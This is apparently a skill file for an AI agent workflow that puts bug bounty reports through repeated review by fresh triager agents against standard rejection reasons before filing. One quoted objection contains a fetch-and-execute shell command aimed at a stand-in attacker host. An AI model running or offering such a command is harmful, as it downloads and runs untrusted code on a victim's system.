---
name: triage-gate
description: Adversarially triage finished bug bounty reports before anything is submitted. Batch every report to one fresh agent per round, test each against the standard rejection scenarios a real triager uses, extract exactly what evidence would fix a rejection, and kill a report that fails three rounds. Use after reports are written and before anything is filed, and again after revising a rejected report.
---

# Triage gate

A report that dies at triage costs more than no report at all: it spends the researcher's signal with the programme, and signal is the thing that gets the next report read carefully. This gate exists to kill weak reports here, where it is free, rather than there, where it is not.

## How to run a round

**One agent, all reports.** Never one agent per report. An agent holding the whole batch compares them against each other and catches the weak one by contrast, which an agent seeing a single report cannot do.

Hand it the reports and the raw evidence and nothing else. No context, no framing, no advocacy, no explanation of how hard the finding was to get. The moment you argue for a report, the verdict is worthless.

**A fresh agent every round.** Never go back to the agent that rejected a report, because it has anchored and will defend its own verdict rather than re-reading the evidence.

Dispatch the plugin agent `bbh:triager` (its brief is `references/agent-brief.md`, baked in, with the browser rule). Give it the finished reports and their cited captures and nothing else. Record its verdict for each report with the bbh tool `record_triage`.

## What the agent tests each report against

**Rejection 1, no gain and no loss.**

> "As an attacker, I gained nothing. As a victim, I lost nothing. As the company, I see no issue. This is at most a functional bug. Nobody gained anything, nobody lost anything, nobody was affected."

**Rejection 2, victim cooperation.**

> "So the victim needs Burp Suite open and has to cooperate with the attacker for this to work."

**Rejection 3, wild assumptions.**

> "This assumes far too much cooperation from the victim. If a victim will do all that, an attacker could just tell them to run `wget attacker.test/malware.sh | bash` to speed up their computer, and skip the bug entirely."

**Rejection 4, the roles do not hold.**

> "The identifiers in the captures do not line up with the roles the report assigns them, or the prose says something the cited file does not show."

**Rejection 5, this is how it works.**

> "This is documented behaviour. It is in the API reference, or the settings UI says exactly this, or the product has always worked this way."

For every rejection the agent must state **specifically what evidence would make that report acceptable**. A verdict with no remedy is a wasted round.

## What to do with the verdicts

Take the rejected reports back to the target and get exactly the evidence named. Then send **all** the revised reports to one fresh agent in the next round.

**When a report is rejected for victim cooperation, do not rewrite the prose. The roles are probably assigned backwards.** Ask instead: what can the attacker do alone, from their own authenticated session, against a stranger's data? On one past target that turned a rejected one-click consent-dialog report into a zero-interaction cross-account authorization bypass on the same endpoint, with the roles swapped. Where a precondition genuinely cannot be removed, frame it as reviewer bootstrap, state plainly that the product creates that state in normal use, and offer a variant that skips it.

A victim clicking a button on an accurate consent dialog is social engineering, not a vulnerability. A victim opening a browser console is instant closure, and the word "victim" must never appear anywhere near a console command, because a skimming triager pattern-matches it.

**Never inflate the framing to raise severity.** Selling a parent-process or parent-command abuse as a sandbox escape, or an injection you control as XSS on the origin, is false, and it hands the triager a clean not-applicable close on a bug that might otherwise have paid. Describe exactly the boundary that was crossed and no wider one.

**Three full rounds and the report is killed.** Record each REJECT with the bbh tool `record_triage`, naming the objection and the exact evidence that would fix it; the third REJECT sets the finding to `killed` with the objection stored, and an ACCEPT sets it to `gated`. `findings-summary.md` lists the killed reports under not-findings automatically. Killing it protects the researcher's standing with the programme.

## Before filing

Replay every request in the report one more time, against the live target, in the exact form the report prints it. A session that looked valid can be dead despite an unexpired `exp` claim, and a captured HTTP/2 request replayed as HTTP/1.1 resets the stream and looks like a fix. A triager who cannot reproduce Step 1 does not read Step 2.

## Session output

`findings-summary.md` is generated by the bbh tool `render_views` from the ledger; run it at the end rather than writing the file by hand. It already carries:

- Confirmed findings that passed this gate, one line each, with severity and report filename.
- Coverage, cells filled over total, as a percentage, and the endpoint count.
- Interesting but unconfirmed behaviours (the `candidate` cells), labelled clearly as **not findings**, with what would confirm each one.
- Reports killed at this gate, with the objection that killed them.
- Cells marked `blocked`, with what would unblock them. This list is usually where the next session starts.

Keep `bug-name-chain.md` by hand for the chain candidates the harness cannot infer, each with what it needs to become reportable.
